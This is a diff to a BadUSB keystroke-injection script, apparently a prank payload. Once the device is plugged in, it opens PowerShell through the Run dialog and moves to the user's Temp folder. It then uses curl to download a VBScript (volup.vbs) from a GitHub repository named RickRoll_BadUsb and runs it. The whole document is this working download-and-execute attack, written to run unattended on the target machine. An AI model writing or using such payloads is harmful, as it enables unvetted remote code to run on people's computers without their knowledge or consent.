@@ -1,3 +1,22 @@
 GUI r
 DELAY 600
 STRING powershell
+ENTER
+DELAY 600
+STRING $user=[System.Environment]::UserName
+ENTER
+DELAY 150
+STRING $tmp="C:\Users\"+$user+"\AppData\Local\Temp"
+ENTER
+DELAY 150
+STRING cd $tmp
+ENTER
+DELAY 150
+STRING curl "https://raw.githubusercontent.com/ExpiredBeatle49/RickRoll_BadUsb/main/volup.vbs" -o volup.vbs
+ENTER
+DELAY 600
+STRING ./volup.vbs
+ENTER
+DELAY 1000
+STRING EXIT
+ENTER
